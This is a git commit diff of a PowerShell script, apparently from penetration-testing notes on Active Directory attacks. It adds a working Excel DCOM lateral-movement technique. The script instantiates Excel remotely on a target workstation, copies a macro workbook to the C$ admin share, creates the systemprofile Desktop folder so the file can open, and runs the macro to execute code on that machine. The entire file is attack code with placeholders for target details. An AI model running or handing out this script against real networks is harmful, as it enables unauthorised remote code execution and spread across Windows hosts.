fe79fc5151e95c955925de1702e52028c60fb82f
Josh Giddings <75488156+giddings32@users.noreply.github.com>
2022-09-16 11:07:16 -0400

    Update exceldcom.ps1

--- Active_Directory/exceldcom.ps1
+++ Active_Directory/exceldcom.ps1
@@ -1,3 +1,15 @@
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<Remote_Workstation_IP>"))
+
 $LocalPath = "C:\Users\<USERNAME>\myexcel.xls"
+
 $RemotePath = "\\<Remote_Workstation_IP>\c$\myexcel.xls"
+
 [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+
+$Path = "\\<Remote_Workstation_IP>\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+
+$temp = [system.io.directory]::createDirectory($Path)
+
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+
+$com.Run("mymacro")
